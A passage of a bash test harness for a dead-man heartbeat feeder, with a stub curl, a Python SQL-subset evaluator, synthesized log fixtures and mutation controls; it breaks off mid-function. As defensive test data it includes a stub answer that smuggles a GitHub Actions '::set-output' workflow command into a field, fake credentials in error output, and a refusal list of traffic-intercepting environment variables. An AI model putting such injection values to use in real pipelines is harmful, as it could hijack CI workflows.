#!/usr/bin/env bash
# Harness for scripts/deadman-heartbeat-feeder.sh (#11631; Guards 1, 2 and 4 of the plan).
#
# WHAT THE FEEDER IS. It beats betteruptime_heartbeat.{luks_monitor_host_timer,claude_cost_capture} ONLY
# while the target's own predicate finds a qualifying row inside the retired alert's OLD window (97200 s /
# 86400 s) in the Better Stack Logs HOT arm (remote()) UNION the ARCHIVE arm (s3Cluster). The failure this
# suite exists to stop is a SPURIOUS BEAT: a feeder that keeps a dead-man alive without a qualifying row hides
# exactly what the control exists to find. Exit 0 must mean exactly {beat, qualifying_row_heartbeat_paused};
# nothing in the script may ever reach a heartbeat /fail URL.
#
# THE FAKE TREE. The feeder is copied to $root/scripts/ and resolves its repo from its own location, so the
# stub scripts/betterstack-query.sh at $root/scripts is what it runs. It runs under `env -i` with a PRIVATE PATH
# ($root/bin holds a stub curl and symlinks to the tools it needs), and a canary proves curl resolves inside it.
# The stub curl models EXACTLY two request shapes (the uptime-API GET and the beat) and refuses anything else with
# status 64 and a line in its call log; every case asserts there is no refusal line.
#
# THE STUB HELPER IS NOT CLICKHOUSE. scripts/betterstack-query.sh is replaced by a small python evaluator for
# the SQL SUBSET the two predicates use (JSONExtractString / JSONExtract path lookups, `= LIKE IN IS NOT NULL`,
# AND / OR / parentheses, the `dt` window against a frozen clock, `_row_type`, the hot/archive UNION). It
# evaluates the SQL the feeder ACTUALLY SENT, so a changed predicate or window changes the verdict. Anything outside
# the subset is refused (status 65), never guessed. Its limits: no type coercion, no locale, no `raw` quirks.
# Phase 0.1 of the plan (the live positive control, knowledge-base/project/specs/archive/20261031-085048-fix-observable-deadman-11631/
# phase0-measurements.md) is what proves the predicates against the real service; the answer shapes used below
# (n as a JSON number or a quoted string, the epoch row for an empty window) were captured there.
#
# EMITTER PINS (Guard 2). The predicate literals are read back from their writers:
#   * `_SYSTEMD_UNIT` is stamped by journald from the unit that logged; luks-monitor.service sets
#     SyslogIdentifier=luks-monitor, which equals luks-monitor.sh's LOG_TAG and the vector.toml
#     host_scripts_journald include_matches tag. `host_name` is written by vector.toml's journald transform
#     (`.host_name = "@@HOST_NAME@@"`), rendered per host from server.tf (web-1 = soleur-web-platform).
#   * the luks needle is luks-monitor.sh's own OK log line; the cost literals are server/claude-cost-marker.ts
#     (`SOLEUR_CLAUDE_COST: true`, pino base component 'claude-cost'), the substrate's `cron:${cronName}` source,
#     and the credit probe's CRON_NAME and op union.
#
# MUTATIONS ARE COMMITTED, NOT HAND-RUN. Each row is applied to a scratch copy by an exact-string replace that
# must match exactly once (it LANDED), and must go RED FOR THE PREDICTED REASON (status and verdict), never a
# crash. Harness rows prove the fixtures can fail (a stub evaluator that qualifies every row flips the negative
# fixtures) and that non-canonical must-PASS inputs stay green. A known-positive and known-negative run prove the
# red detector first.
#
# THE VERDICT OWNERS ARE CONTROLLED. expect, ctl, land, expect_red, expect_lost, expect_gained, expect_residue,
# static_red, wire_red, w_mut, w_block, w_sblock, sec_mut, wfm, wf_check and wf_mut_red each decide a whole family of
# rows; one neutered to always-pass would leave the suite green at the same count. own_ctl drives each owner, in a
# subshell, with a known survivor and a known wrong-reason input and requires exactly one failure carrying the
# owner's own diagnostic; a failed control stops the suite with printf and exit, not through the helpers. own_ctl is
# itself controlled (own_meta: two failures, none, and a wrong needle must stop the suite, one failure with the needle
# must not). expect_lost / expect_gained take the verdict the mutant must still END in, so a mutant that went red some
# other valid way cannot read as the predicted loss or gain.
#
# NO UNLISTED COMMAND. The static pins hold the feeder to a CLOSED SET of command words (CMD_ALLOW; the lexer is
# cmdaudit.py, written below and controlled by known-positive and known-negative snippets), not a denylist of network
# clients: a quoted, variable-built, absolute-path or unlisted program is a violation by construction.
#
# FLOORS (MIN_PASSES, MIN_BEAT_ASSERTS at the end) are EXACT and compared with `!=`: they equal the measured counts,
# so deleting a case AND adding one both trip them. Changing a case means setting them to the counts the run prints.
#
# Fixtures are synthesized (cq-test-fixtures-synthesized-only); the live captures contributed
# only the one-line aggregate answer SHAPE, never a row.

set -uo pipefail
export TMPDIR="${TMPDIR:-/var/tmp}"

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$HERE/../../../.." && pwd)"
FEEDER_NAME="deadman-heartbeat-feeder.sh"
FEEDER_SRC="$REPO/scripts/$FEEDER_NAME"
WORKFLOW="$REPO/.github/workflows/scheduled-deadman-heartbeat-feeder.yml"
TABLE_TS="$REPO/apps/web-platform/server/watchdog-dispatch-table.ts"
UPTIME_TF="$REPO/apps/web-platform/infra/uptime-alerts.tf"
APPLY_WF="$REPO/.github/workflows/apply-web-platform-infra.yml"
MONITORS_TF="$REPO/apps/web-platform/infra/sentry/cron-monitors.tf"
ALERTS_TF="$REPO/apps/web-platform/infra/sentry/cron-monitor-alerts.tf"
MANIFEST_TS="$REPO/plugins/soleur/lib/heartbeat-manifest.ts"
EMIT_LUKS="$REPO/apps/web-platform/infra/luks-monitor.sh"
EMIT_LUKS_UNIT="$REPO/apps/web-platform/infra/luks-monitor.service"
EMIT_VECTOR="$REPO/apps/web-platform/infra/vector.toml"
EMIT_SERVER_TF="$REPO/apps/web-platform/infra/server.tf"
EMIT_MARKER="$REPO/apps/web-platform/server/claude-cost-marker.ts"
EMIT_SUBSTRATE="$REPO/apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts"
EMIT_PROBE="$REPO/apps/web-platform/server/inngest/functions/cron-anthropic-credit-probe.ts"

fails=0
passes=0
cases=0
beat_asserts=0
# Is en_US.utf8 both installed and settable? (R10 and the non-C locale pin below need it.) A pipe into `grep -q`
# under pipefail can report a SIGPIPE, so the listing is captured first.
_locales="$(locale -a 2>/dev/null)"
HAVE_UTF8_LOCALE=0
if grep -qiE '^en_US\.utf-?8$' <<<"$_locales" && [[ "$(LC_ALL=en_US.utf8 bash -c : 2>&1)" != *"cannot change locale"* ]]; then HAVE_UTF8_LOCALE=1; fi
pass() { printf '  PASS: %s\n' "$1"; passes=$((passes + 1)); }
fail() { printf '  FAIL: %s\n' "$1" >&2; fails=$((fails + 1)); }

# own_ctl <label> <needle> <driver-fn> [args...]: the control of a VERDICT OWNER (expect_red, static_red, wire_red,
# wf_check, ctl, land, ...). A helper that can be neutered to always-pass would turn every row it grades green
# with 0 failures, so each owner is driven here, in a SUBSHELL (its counters die with it: nothing to unwind),
# against ONE deliberately wrong input, and must emit EXACTLY ONE failure line carrying its own diagnostic and no
# pass line. The control reports through printf and exit, never through pass()/fail() or any helper under test.
own_ctl() {
  local label="$1" needle="$2" out nf np
  shift 2
  out="$("$@" 2>&1)"
  nf="$(grep -c '^  FAIL:' <<<"$out" || true)"; np="$(grep -c '^  PASS:' <<<"$out" || true)"
  cases=$((cases + 1))
  if [[ "$nf" == 1 && "$np" == 0 ]] && grep -qF -- "$needle" <<<"$out"; then
    printf '  PASS: verdict-owner control: %s\n' "$label"; passes=$((passes + 1))
  else
    printf 'FATAL: verdict-owner control FAILED: %s (saw %s failure line(s) and %s pass line(s); wanted exactly one failure carrying: %s)\n' "$label" "$nf" "$np" "$needle" >&2
    sed 's/^/        | /' <<<"$out" >&2
    exit 1
  fi
}

[[ -f "$FEEDER_SRC" ]] || { echo "FATAL: feeder not found at $FEEDER_SRC" >&2; exit 1; }
PY="$(type -P python3)" || { echo "FATAL: python3 not found" >&2; exit 1; }
BASH_BIN="$(type -P bash)"

# Canonical guard, copied byte-for-byte from plugins/soleur/test/test-helpers.sh.
assert_fixture_dir() {
  case "${1-}" in
    "") printf 'FATAL: fixture dir is EMPTY; git -C "" would operate on %s\n' "$PWD" >&2; exit 2 ;;
    */../*|*/..) printf 'FATAL: fixture dir %s contains ..; refusing\n' "$1" >&2; exit 2 ;;
    /proc/*|/sys/*|/dev/*) printf 'FATAL: fixture dir %s is a synthetic-fs path; refusing\n' "$1" >&2; exit 2 ;;
    /|//|/.) printf 'FATAL: fixture dir resolves to the filesystem root; refusing\n' >&2; exit 2 ;;
    /*) : ;;
    *)  printf 'FATAL: fixture dir %s is RELATIVE; refusing\n' "$1" >&2; exit 2 ;;
  esac
}
WORK="$(mktemp -d "${TMPDIR}/deadman-heartbeat-feeder.XXXXXXXX")" || { echo "FATAL: mktemp failed" >&2; exit 1; }
assert_fixture_dir "$WORK"
trap 'rm -rf -- "$WORK"' EXIT
mkdir -p "$WORK/fx" "$WORK/mut" "$WORK/tmp"

# ── fabricated identities and the pinned clock ────────────────────────────────────────────────
NOW_EPOCH=1793361600   # 2026-10-30T12:00:00Z; the stub evaluator's `now()`
TOKEN="SYNTHtokenAbCdEf0123456789xyz"
HB_ID_SENTINEL="SYNTHping9Xk2Zq"
HB_URL="https://uptime.betterstack.com/api/v1/heartbeat/$HB_ID_SENTINEL"
FAKE_CRED="dp.ct.NOT_A_REAL_TOKEN_11631_synthetic"
Q_PASS="pw-SYNTH-9f2c1d7a"
Q_USER="user-SYNTH-77aa"
BAD_TOKEN_SENT="SYNTHbadTOKENqq9"
BAD_URL_SENT="SYNTHbadURLid9"
TLS_NAMES="SSLKEYLOGFILE CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME HOSTALIASES LOCALDOMAIN RES_OPTIONS"

# The independent expected target set, frozen HERE (set identity, never a `>= N` floor). An edit that changes
# the script and this table in one diff proves consistency only; integrity comes from the emitter pins below, the
# Phase 0.1 live capture and the Phase 0.5 verbatim-move check.
T_LUKS="luks-monitor-host-timer"; T_COST="claude-cost-capture"
EXPECT_TARGETS="$T_LUKS $T_COST"
declare -A E_WINDOW=([$T_LUKS]=97200 [$T_COST]=86400)
declare -A E_NAME=([$T_LUKS]="soleur-luks-monitor-host-timer-prd" [$T_COST]="soleur-claude-cost-capture-prd")
declare -A E_PRED=(
  [$T_LUKS]="JSONExtractString(raw, 'SYSLOG_IDENTIFIER') = 'luks-monitor' AND JSONExtractString(raw, '_SYSTEMD_UNIT') = 'luks-monitor.service' AND JSONExtractString(raw, 'message') LIKE '%OK: /mnt/data is LUKS-backed%' AND JSONExtractString(raw, 'host_name') = 'soleur-web-platform'"
  [$T_COST]="((raw LIKE '%\"SOLEUR_CLAUDE_COST\":true%' AND JSONExtractString(raw, 'message', 'component') = 'claude-cost' AND JSONExtractString(raw, 'message', 'source') LIKE 'cron:%' AND JSONExtract(raw, 'message', 'cost_usd', 'Nullable(Float64)') IS NOT NULL) OR (JSONExtractString(raw, 'message', 'feature') = 'cron-anthropic-credit-probe' AND JSONExtractString(raw, 'message', 'op') IN ('anthropic-credit-exhausted', 'anthropic-key-invalid')))"
)
expect_sql() { # <target> <predicate> -> the SQL the feeder must send (frozen shape)
  local w="${E_WINDOW[$1]}" win
  win="dt > now() - INTERVAL $w SECOND AND dt <= now() + INTERVAL 300 SECOND"
  printf 'SELECT count() AS n, toString(max(dt)) AS newest FROM (SELECT dt, raw FROM remote($BS_TABLE) WHERE %s UNION ALL SELECT dt, raw FROM s3Cluster(primary, $BS_TABLE_S3) WHERE _row_type = 1 AND %s) WHERE %s FORMAT JSONEachRow' "$win" "$win" "$2"
}

# ── fixture builders ──────────────────────────────────────────────────────────────────────────
H=3600
OK_MSG='OK: /mnt/data is LUKS-backed (device_type=crypto_LUKS mount_source=/dev/mapper/synth escrow=ok header=readable boot_id=synthetic)'
FAIL_MSG='FAIL (not_mounted): device_type=none mount_source=none mapper_present=0 luks_open_result=skipped'
luks_raw() { # [identifier] [unit|__none__] [message] [host_name]
  jq -cn --arg id "${1:-luks-monitor}" --arg unit "${2-luks-monitor.service}" --arg msg "${3:-$OK_MSG}" --arg host "${4:-soleur-web-platform}" \
    '{SYSLOG_IDENTIFIER: $id, host_name: $host, message: $msg} + (if $unit == "__none__" then {} else {_SYSTEMD_UNIT: $unit} end)'
}
cost_raw() { # <source> [cost-json|"absent"] [component] [flag-key]
  # The cost goes in as a string and is decoded in jq: "absent" is not JSON, so --argjson would have emitted
  # nothing and every "absent" fixture would have been an empty window (a withhold for the wrong reason).
  jq -cn --arg src "$1" --arg comp "${3:-claude-cost}" --arg flag "${4:-SOLEUR_CLAUDE_COST}" --arg cs "${2:-0.25}" \
    '{message: ({($flag): true, component: $comp, source: $src} + (if $cs == "absent" then {} else {cost_usd: ($cs | fromjson)} end))}'
}
probe_raw() { # <op>
  jq -cn --arg op "$1" '{message: {feature: "cron-anthropic-credit-probe", op: $op}}'
}
row() { # <arm hot|s3> <age_s> <raw-json> [row_type]
  jq -cn --arg arm "$1" --argjson age "$2" --argjson raw "$3" --argjson rt "${4:-1}" '{arm: $arm, age: $age, row_type: $rt, raw: $raw}'
}
fx() { cat > "$WORK/fx/$1.jsonl"; printf '%s' "$WORK/fx/$1.jsonl"; }
hb_json() { # <name> <paused-literal|__absent__> <url> -> one-heartbeat API body
  jq -cn --arg n "$1" --arg p "$2" --arg u "$3" '
    {data: [{id: "504655", type: "heartbeat",
      attributes: ({name: $n, url: $u, period: 3600, grace: 7200, status: "paused"}
        + (if $p == "__absent__" then {} else {paused: ($p | fromjson)} end))}],
     pagination: {first: "https://uptime.betterstack.com/api/v2/heartbeats?page=1", last: "https://uptime.betterstack.com/api/v2/heartbeats?page=1", prev: null, next: null}}'
}

# ── the stub evaluator (python; see the header for its limits) ───────────────────────────────────
write_evaluator() { # <dest>
  cat > "$1" <<'PYEVAL'
import json, re, sys, datetime

sql, cfg_path, rows_path = sys.argv[1], sys.argv[2], sys.argv[3]
cfg = json.load(open(cfg_path))
NOW = float(cfg["now"])


class Unsupported(Exception):
    pass


TOK = re.compile(
    r"""\s*(?:(?P<str>'(?:[^'\\]|\\.|'')*')|(?P<num>\d+(?:\.\d+)?)|(?P<id>\$?[A-Za-z_][A-Za-z0-9_]*)|(?P<op><=|>=|!=|=|<|>|\(|\)|,|\+|-))"""
)


def tokenize(s):
    s = s.strip()
    pos, out = 0, []
    while pos < len(s):
        m = TOK.match(s, pos)
        if not m or m.end() == pos:
            raise Unsupported("token at %d: %r" % (pos, s[pos:pos + 20]))
        pos = m.end()
        if m.group("str") is not None:
            body = m.group("str")[1:-1].replace("''", "'")
            body = re.sub(r"\\(.)", r"\1", body)
            out.append(("str", body))
        elif m.group("num") is not None:
            out.append(("num", float(m.group("num"))))
        elif m.group("id") is not None:
            out.append(("id", m.group("id")))
        else:
            out.append(("op", m.group("op")))
    return out


class Parser:
    def __init__(self, toks):
        self.t, self.i = toks, 0

    def peek(self):
        return self.t[self.i] if self.i < len(self.t) else ("eof", None)

    def take(self):
        tok = self.peek()
        self.i += 1
        return tok

    def kw(self, word):
        k, v = self.peek()
        return k == "id" and v.upper() == word

    def expect_kw(self, word):
        if not self.kw(word):
            raise Unsupported("expected %s at %r" % (word, self.peek()))
        self.take()

    def expect_op(self, op):
        if self.peek() != ("op", op):
            raise Unsupported("expected %s at %r" % (op, self.peek()))
        self.take()

    # value expressions ------------------------------------------------------------------
    def value(self):
        k, v = self.take()
        if k == "str":
            e = lambda row, c=v: c
        elif k == "num":
            e = lambda row, c=v: c
        elif k == "id":
            if self.peek() == ("op", "("):
                self.take()
                args = []
                if self.peek() != ("op", ")"):
                    while True:
                        args.append(self.value())
                        if self.peek() == ("op", ","):
                            self.take()
                            continue
                        break
                self.expect_op(")")
                e = self.call(v.lower(), args)
            elif v == "dt":
                e = lambda row: row["dt"]
            elif v == "_row_type":
                e = lambda row: row["row_type"]
            elif v == "raw":
                e = lambda row: row["rawtext"]
            else:
                raise Unsupported("identifier %r" % v)
        else:
            raise Unsupported("value at %r" % ((k, v),))
        while self.peek() in (("op", "+"), ("op", "-")):
            sign = 1 if self.take()[1] == "+" else -1
            self.expect_kw("INTERVAL")
            nk, nv = self.take()
            if nk != "num":
                raise Unsupported("interval count")
            self.expect_kw("SECOND")
            e = (lambda row, a=e, d=sign * nv: a(row) + d)
        return e

    def call(self, name, args):
        if name == "now":
            return lambda row: NOW
        if name in ("jsonextractstring", "jsonextract"):
            consts = [a(None) for a in args[1:]]
            if name == "jsonextractstring":
                path = consts

                def f(row):
                    o = json.loads(row["rawtext"])
                    for k in path:
                        if isinstance(o, dict) and k in o:
                            o = o[k]
                        else:
                            return ""
                    return o if isinstance(o, str) else ""

                return f
            if consts[-1] != "Nullable(Float64)":
                raise Unsupported("JSONExtract type %r" % consts[-1])
            path = consts[:-1]

            def g(row):
                o = json.loads(row["rawtext"])
                for k in path:
                    if isinstance(o, dict) and k in o:
                        o = o[k]
                    else:
                        return None
                return float(o) if isinstance(o, (int, float)) and not isinstance(o, bool) else None

            return g
        raise Unsupported("function %r" % name)

    # boolean expressions ----------------------------------------------------------------
    def atom(self):
        if self.peek() == ("op", "("):
            self.take()
            e = self.or_()
            self.expect_op(")")
            return e
        left = self.value()
        k, v = self.peek()
        if k == "op" and v in ("=", "!=", "<", ">", "<=", ">="):
            self.take()
            right = self.value()
            ops = {
                "=": lambda a, b: a == b, "!=": lambda a, b: a != b, "<": lambda a, b: a < b,
                ">": lambda a, b: a > b, "<=": lambda a, b: a <= b, ">=": lambda a, b: a >= b,
            }
            f = ops[v]
            return lambda row: f(left(row), right(row))
        if self.kw("LIKE"):
            self.take()
            pk, pv = self.take()
            if pk != "str":
                raise Unsupported("LIKE pattern")
            rx = re.compile("^" + "".join(".*" if c == "%" else "." if c == "_" else re.escape(c) for c in pv) + "$", re.S)
            return lambda row: bool(rx.match(left(row) or "")) if LIKE_MODE == "real" else True
        if self.kw("IN"):
            self.take()
            self.expect_op("(")
            vals = []
            while True:
                pk, pv = self.take()
                if pk != "str":
                    raise Unsupported("IN member")
                vals.append(pv)
                if self.peek() == ("op", ","):
                    self.take()
                    continue
                break
            self.expect_op(")")
            return lambda row: left(row) in vals
        if self.kw("IS"):
            self.take()
            self.expect_kw("NOT")
            self.expect_kw("NULL")
            return lambda row: left(row) is not None
        raise Unsupported("atom at %r" % (self.peek(),))

    def and_(self):
        parts = [self.atom()]
        while self.kw("AND"):
            self.take()
            parts.append(self.atom())
        return lambda row: all(p(row) for p in parts)

    def or_(self):
        parts = [self.and_()]
        while self.kw("OR"):
            self.take()
            parts.append(self.and_())
        return lambda row: any(p(row) for p in parts)


LIKE_MODE = "real"
ROW_FILTER_MODE = "real"
# (harness rows rewrite the two constants above to build the "every row qualifies" evaluators)


def keep(expr, row):
    return bool(expr(row))


def main():
    p = Parser(tokenize(sql))
    for w in ("SELECT", "count"):
        p.take()
    p.expect_op("("); p.expect_op(")")
    p.expect_kw("AS"); p.take(); p.expect_op(",")
    for w in ("toString",):
        p.take()
    p.expect_op("("); p.take(); p.expect_op("("); p.take(); p.expect_op(")"); p.expect_op(")")
    p.expect_kw("AS"); p.take(); p.expect_kw("FROM"); p.expect_op("(")
    rows = []
    for raw_row in open(rows_path):
        raw_row = raw_row.strip()
        if raw_row:
            rows.append(json.loads(raw_row))
    union = []
    first = True
    while True:
        p.expect_kw("SELECT"); p.take(); p.expect_op(","); p.take(); p.expect_kw("FROM")
        fn = p.take()[1]
        p.expect_op("(")
        if fn == "remote":
            tbl = p.take()
            if tbl != ("id", "$BS_TABLE"):
                raise Unsupported("hot table %r" % (tbl,))
            arm = "hot"
        elif fn == "s3Cluster":
            if p.take() != ("id", "primary"):
                raise Unsupported("cluster")
            p.expect_op(",")
            tbl = p.take()
            if tbl != ("id", "$BS_TABLE_S3"):
                raise Unsupported("archive table %r" % (tbl,))
            arm = "s3"
        else:
            raise Unsupported("table function %r" % fn)
        p.expect_op(")")
        p.expect_kw("WHERE")
        expr = p.or_()
        for r in rows:
            if r["arm"] != arm:
                continue
            row = {"dt": NOW - float(r["age"]), "row_type": r["row_type"],
                   "rawtext": json.dumps(r["raw"], separators=(",", ":"), ensure_ascii=False)}
            if keep(expr, row):
                union.append(row)
        if p.kw("UNION"):
            p.take(); p.expect_kw("ALL")
            continue
        break
    p.expect_op(")")
    p.expect_kw("WHERE")
    outer = p.or_()
    p.expect_kw("FORMAT"); p.expect_kw("JSONEACHROW")
    if p.peek()[0] != "eof":
        raise Unsupported("trailing tokens")
    hits = [r for r in union if keep(outer, r)]
    n = len(hits)
    if hits:
        ts = max(r["dt"] for r in hits)
        newest = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")
    else:
        newest = "1970-01-01 00:00:00.000000"
    print(json.dumps({"n": str(n) if cfg.get("n_string") else n, "newest": newest}, separators=(",", ":")))


try:
    main()
except Unsupported as e:
    sys.stderr.write("STUB EVALUATOR: unsupported SQL: %s\n" % e)
    sys.exit(65)
PYEVAL
}
write_evaluator "$WORK/evaluator.py"
# Harness-row evaluators (the fixtures must be able to FAIL): every row qualifies / LIKE is always true.
"$PY" -I - "$WORK/evaluator.py" "$WORK/eval-allrows.py" "$WORK/eval-likeall.py" <<'PYM'
import sys
s = open(sys.argv[1]).read()
a = "def keep(expr, row):\n    return bool(expr(row))"
assert s.count(a) == 1
open(sys.argv[2], "w").write(s.replace(a, "def keep(expr, row):\n    return True"))
b = 'LIKE_MODE = "real"'
assert s.count(b) == 1
open(sys.argv[3], "w").write(s.replace(b, 'LIKE_MODE = "all"'))
PYM

# ── the runner ────────────────────────────────────────────────────────────────────────────────
# Per-case seams (reset_case clears them):
#   C_TARGET  feeder argv[1]                        C_ARGS    argv override (string, word-split) when non-empty
#   C_ROWS    fixture rows file the evaluator reads C_STUB    ok | okstr | fail | failbody | garbage | zero | two | ...
#   C_API     API body file                          C_APIMODE ok | fail
#   C_BEATMODE 200|429|500|302|403body|curlfail|timeout  C_TOKEN __unset__ | value  C_UNSET a BETTERSTACK_QUERY_* to blank
#   C_XTRACE  1 -> bash -x                           C_SRC     feeder source (default shipped)   C_EVAL evaluator file
#   C_BEATS / C_APIS / C_Q expected beat calls, API calls, helper queries
#   C_NOERT   1 -> the feeder is sourced by a bash that has unset EPOCHREALTIME (an older bash has none)
reset_case() {
  C_TARGET="$T_LUKS"; C_ARGS=""; C_ROWS="/dev/null"; C_STUB="ok"; C_API=""; C_APIMODE="ok"; C_BEATMODE="200"
  C_TOKEN="$TOKEN"; C_UNSET=""; C_XTRACE=0; C_SRC="$FEEDER_SRC"; C_EVAL="$WORK/evaluator.py"
  C_BEATS=0; C_APIS=0; C_Q=1; C_TLSENV=0; C_GHA=0; C_NAME_OVERRIDE=""; C_LCALL=""; C_NOERT=0
}
reset_case

OUT="$WORK/out"
CALLS="$WORK/root/calls.log"
SQLLOG="$WORK/root/sql.log"
write_stubs() { # <root>
  local root="$1"
  assert_fixture_dir "$root"
  mkdir -p "$root/bin" "$root/scripts"
  local t p
  for t in jq date grep sed tr cut head tail sort wc mktemp rm cat dirname bash env; do
    p="$(type -P "$t")" || { echo "FATAL: $t not found" >&2; exit 1; }
    ln -s "$p" "$root/bin/$t"
  done
  cat > "$root/bin/curl" <<STUB
#!$BASH_BIN
R="\$(cd "\$(dirname "\$0")/.." && pwd)"
LOG="\$R/calls.log"
argv="\$*"
stdin="\$(cat)"
tok="\$(cat "\$R/token.txt")"
for n in $TLS_NAMES; do if [ -n "\${!n:-}" ]; then echo "refused env \$n" >> "\$LOG"; exit 64; fi; done
A_ARGV='--disable --noproxy * -fsS --max-time 20 --connect-timeout 10 --config - https://uptime.betterstack.com/api/v2/heartbeats?per_page=250'
B_ARGV='--disable --noproxy * -fsS --max-time 15 --connect-timeout 10 -o /dev/null -w %{http_code} --config -'
if [[ "\$argv" == "\$A_ARGV" ]]; then
  if [[ "\$stdin" != "header = \"Authorization: Bearer \$tok\"" ]]; then echo "refused api-stdin" >> "\$LOG"; exit 64; fi
  echo api >> "\$LOG"
  [[ "\$(cat "\$R/api.mode")" == fail ]] && exit 7
  cat "\$R/api.body"
  exit 0
elif [[ "\$argv" == "\$B_ARGV" ]]; then
  exp="\$(cat "\$R/expect_url")"
  echo beat >> "\$LOG"
  if [[ "\$stdin" != "url = \"\$exp\"" ]]; then echo "refused beat-stdin" >> "\$LOG"; exit 64; fi
  case "\$(cat "\$R/beat.mode")" in
    200) printf 200; exit 0 ;;
    429) echo "Retry-After: 30" >&2; printf 429; exit 22 ;;
    500) printf 500; exit 22 ;;
    302) printf 302; exit 0 ;;
    403body) echo "{\"error\":\"denied token=$FAKE_CRED url=\$exp\"}" >&2; printf 403; exit 22 ;;
    timeout) exit 28 ;;
    *)   exit 7 ;;
  esac
fi
echo "refused argv" >> "\$LOG"
exit 64
STUB
  chmod +x "$root/bin/curl"
}

run_feeder() { # -> echoes the status; combined output in $OUT
  local root="$WORK/root" feeder
  feeder="$root/scripts/$FEEDER_NAME"
  case "$root" in "$WORK"/root) rm -rf -- "$root" ;; *) echo 199; return ;; esac
  write_stubs "$root"
  cp "$C_SRC" "$feeder"
  : > "$CALLS"; : > "$SQLLOG"
  printf '%s' "$TOKEN" > "$root/token.txt"
  printf '%s' "$HB_URL" > "$root/expect_url"
  printf '%s' "$C_APIMODE" > "$root/api.mode"
  printf '%s' "$C_BEATMODE" > "$root/beat.mode"
  if [[ -n "$C_API" ]]; then cp "$C_API" "$root/api.body"; else hb_json "${C_NAME_OVERRIDE:-${E_NAME[$C_TARGET]:-x}}" false "$HB_URL" > "$root/api.body"; fi
  printf '{"now": %s, "n_string": %s}' "$NOW_EPOCH" "$([[ "$C_STUB" == okstr ]] && echo true || echo false)" > "$root/stub.cfg"
  cp "$C_ROWS" "$root/rows.jsonl"
  cp "$C_EVAL" "$root/evaluator.py"

  if [[ "$C_STUB" != "none" ]]; then
    cat > "$root/scripts/betterstack-query.sh" <<STUB
#!$BASH_BIN
R="\$(cd "\$(dirname "\$0")/.." && pwd)"
printf '%s\n' "\$*" >> "\$R/sql.log"
# The helper's mode-1 dispatch: ONE argument that starts with SELECT. A flag (--no-archive) or an extra
# argument is refused, exactly as the real helper would not treat it as raw SQL.
[[ \$# -eq 1 ]] || { echo "STUB: unexpected argc \$#" >&2; exit 64; }
[[ "\$1" =~ ^[[:space:]]*(SELECT|WITH|SHOW)[[:space:]] ]] || { echo "STUB: not raw SQL" >&2; exit 64; }
# The feeder must scrub these before the helper (the helper exports its own).
[[ -z "\${BS_TABLE+x}" && -z "\${BS_TABLE_S3+x}" ]] || { echo "STUB: BS_TABLE leaked into the helper env" >&2; exit 64; }
case "\$1" in *\$'\n'*) echo "STUB: SQL contains a newline" >&2; exit 64 ;; esac
evaluate() { $PY -I "\$R/evaluator.py" "\$1" "\$R/stub.cfg" "\$R/rows.jsonl"; }
case "$C_STUB" in
  ok|okstr) evaluate "\$1"; exit \$? ;;
  fail)
    echo "betterstack-query: auth failed for user=$Q_USER password=$FAKE_CRED" >&2
    echo "curl: (22) https://stub/?token=$FAKE_CRED"
    exit 7 ;;
  failbody)
    echo '{"exception":"Code: 62. DB::Exception: password='"$FAKE_CRED"'"}'
    exit 22 ;;
  garbage) echo "<html>502 Bad Gateway</html>"; exit 0 ;;
  zero) exit 0 ;;
  two) evaluate "\$1"; evaluate "\$1"; exit 0 ;;
  nonnumeric) echo '{"n":"abc","newest":"1970-01-01 00:00:00.000000"}'; exit 0 ;;
  negn) echo '{"n":"-1","newest":"1970-01-01 00:00:00.000000"}'; exit 0 ;;
  floatn) echo '{"n":1.5,"newest":"1970-01-01 00:00:00.000000"}'; exit 0 ;;
  bign) echo '{"n":"99999999999999999999","newest":"1970-01-01 00:00:00.000000"}'; exit 0 ;;
  exception) echo '{"exception":"Code: 60. DB::Exception: Table does not exist"}'; exit 0 ;;
  nolinen) echo '{"newest":"2026-10-30 00:04:56.747448"}'; exit 0 ;;
  nonobj) echo '[1]'; exit 0 ;;
  nulln) echo '{"n":null,"newest":"x"}'; exit 0 ;;
  hostile) echo '{"n":3,"newest":"2026-10-30 00:04:56 ::set-output name=x::y"}'; exit 0 ;;
  zpad2) echo '{"n":"00","newest":"1970-01-01 00:00:00.000000"}'; exit 0 ;;
  zpad3) echo '{"n":"000","newest":"1970-01-01 00:00:00.000000"}'; exit 0 ;;
  zpad7) echo '{"n":"007","newest":"2026-10-30 00:04:56.747448"}'; exit 0 ;;
  tabn) echo '{"n":"5\\tX","newest":"2026-10-30 00:04:56.747448"}'; exit 0 ;;
  exceptionn) echo '{"n":3,"exception":"Code: 60. DB::Exception: Table does not exist","newest":"2026-10-30 00:04:56.747448"}'; exit 0 ;;
  arabicnewest) echo '{"n":3,"newest":"٢٠٢٦-١٠-٣٠ ٠٠:٠٤:٥٦.٧٤٧٤٤٨"}'; exit 0 ;;
  hugenewest) echo '{"n":3,"newest":"'"\$(printf 'A%.0s' \$(seq 1 300))"'"}'; exit 0 ;;
  numnewest) echo '{"n":3,"newest":12345}'; exit 0 ;;
esac
STUB
    chmod +x "$root/scripts/betterstack-query.sh"
  fi

  # A private TMPDIR: the post-suite residue check must see only this suite's feeder runs.
  local -a envv=(PATH="$root/bin" HOME="$HOME" TMPDIR="$WORK/tmp")
  [[ -z "$C_LCALL" ]] || envv+=("LC_ALL=$C_LCALL" "LANG=$C_LCALL")
  local v
  for v in BETTERSTACK_QUERY_HOST BETTERSTACK_QUERY_USERNAME BETTERSTACK_QUERY_PASSWORD; do
    if [[ "$C_UNSET" == "$v" ]]; then
      envv+=("$v=")
    else
      case "$v" in
        BETTERSTACK_QUERY_PASSWORD) envv+=("$v=$Q_PASS") ;;
        BETTERSTACK_QUERY_USERNAME) envv+=("$v=$Q_USER") ;;
        *) envv+=("$v=stub.example") ;;
      esac
    fi
  done
  [[ "$C_TOKEN" == "__unset__" ]] || envv+=("BETTERSTACK_API_TOKEN_READONLY=$C_TOKEN")
  # A stale export of the sibling's seam names must change nothing here (this script has no seams at all).
  envv+=("INNGEST_FEEDER_NOW=2000-01-01T00:00:00Z" "BS_TABLE=stale_table_from_caller" "BS_TABLE_S3=stale_s3_from_caller")
  if [[ "$C_TLSENV" == 1 ]]; then
    local _tn
